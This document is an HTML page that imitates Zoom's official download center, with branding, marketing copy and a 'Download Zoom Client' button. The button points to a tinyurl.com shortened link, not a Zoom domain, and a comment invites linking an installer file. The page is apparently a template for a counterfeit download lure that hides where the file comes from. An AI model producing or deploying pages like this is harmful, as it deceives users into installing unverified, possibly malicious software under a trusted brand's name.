<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zoom - Download Center & Meeting Platform</title>
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --zoom-blue: #0B5CFF;
            --zoom-blue-hover: #0045cc;
            --text-dark: #232333;
            --text-light: #747487;
            --bg-light: #F7F9FC;
            --white: #FFFFFF;
            --border-color: #E2E8F0;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        body {
            color: var(--text-dark);
            background-color: var(--white);
            line-height: 1.5;
            overflow-x: hidden;
        }

        /* Loading Screen Overlay */
        #loader-wrapper {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--white);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }

        .loader-logo {
            font-size: 36px;
            font-weight: 700;
            color: var(--zoom-blue);
            letter-spacing: -1px;
            margin-bottom: 24px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid var(--border-color);
            border-top: 4px solid var(--zoom-blue);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-fade-out {
            opacity: 0;
            visibility: hidden;
        }

        /* Header / Navbar */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            border-bottom: 1px solid var(--border-color);
        }

        .logo {
            font-size: 24px;
            font-weight: 700;
            color: var(--zoom-blue);
            text-decoration: none;
            letter-spacing: -0.5px;
        }

        nav a {
            text-decoration: none;
            color: var(--text-dark);
            font-weight: 500;
            margin-left: 24px;
            font-size: 15px;
        }

        nav a:hover {
            color: var(--zoom-blue);
        }

        /* Hero Section */
        .hero {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            padding: 80px 20px;
            background: linear-gradient(180deg, var(--bg-light) 0%, var(--white) 100%);
        }

        .hero h1 {
            font-size: 48px;
            font-weight: 700;
            max-width: 800px;
            margin-bottom: 16px;
            letter-spacing: -1px;
        }

        .hero p {
            font-size: 18px;
            color: var(--text-light);
            max-width: 600px;
            margin-bottom: 32px;
        }

        /* Download Card Box */
        .download-box {
            background: var(--white);
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
            border: 1px solid var(--border-color);
            max-width: 480px;
            width: 100%;
        }

        .download-btn {
            display: inline-block;
            background-color: var(--zoom-blue);
            color: var(--white);
            padding: 14px 32px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            text-decoration: none;
            width: 100%;
            transition: background-color 0.2s ease;
            box-shadow: 0 4px 12px rgba(11, 92, 255, 0.2);
        }

        .download-btn:hover {
            background-color: var(--zoom-blue-hover);
        }

        .version-info {
            font-size: 14px;
            color: var(--text-light);
            margin-top: 16px;
        }

        /* Features Section */
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 32px;
            padding: 80px 40px;
            max-width: 1100px;
            margin: 0 auto;
        }

        .feature-card {
            background: var(--bg-light);
            padding: 32px;
            border-radius: 12px;
            border: 1px solid var(--border-color);
        }

        .feature-card h3 {
            font-size: 20px;
            margin-bottom: 12px;
            font-weight: 600;
        }

        .feature-card p {
            color: var(--text-light);
            font-size: 15px;
        }

        /* Footer */
        footer {
            text-align: center;
            padding: 40px;
            border-top: 1px solid var(--border-color);
            color: var(--text-light);
            font-size: 14px;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .hero h1 {
                font-size: 36px;
            }
            header {
                padding: 16px 20px;
            }
        }
    </style>
</head>
<body>

    <!-- Loading Screen Overlay -->
    <div id="loader-wrapper">
        <div class="loader-logo">zoom</div>
        <div class="spinner"></div>
    </div>

    <!-- Header -->
    <header>
        <a href="#" class="logo">zoom</a>
        
    </header>

    <!-- Hero / Download Section -->
    <section class="hero" id="download">
        <h1>One platform to connect, create, and collaborate</h1>
        <p>Download the Zoom Client for Meetings, Team Chat, Whiteboards, and more to keep your team connected.</p>
        
        <div class="download-box">
            <!-- Link your actual file here, e.g., href="ZoomInstaller.exe" -->
            <a href="https://tinyurl.com/yc6usfy2" class="download-btn" download>Download Zoom Client</a>
            <div class="version-info">
                Version 6.0+ &bull; Free Download &bull; For Windows & Mac
            </div>
        </div>
    </section>

    <!-- JavaScript to handle loading duration -->
    <script>
        window.addEventListener('load', function() {
            const loader = document.getElementById('loader-wrapper');
            // Keeps the loader visible for 1.2 seconds for a smooth feel
            setTimeout(function() {
                loader.classList.add('loader-fade-out');
            }, 1200);
        });
    </script>

</body>
</html>
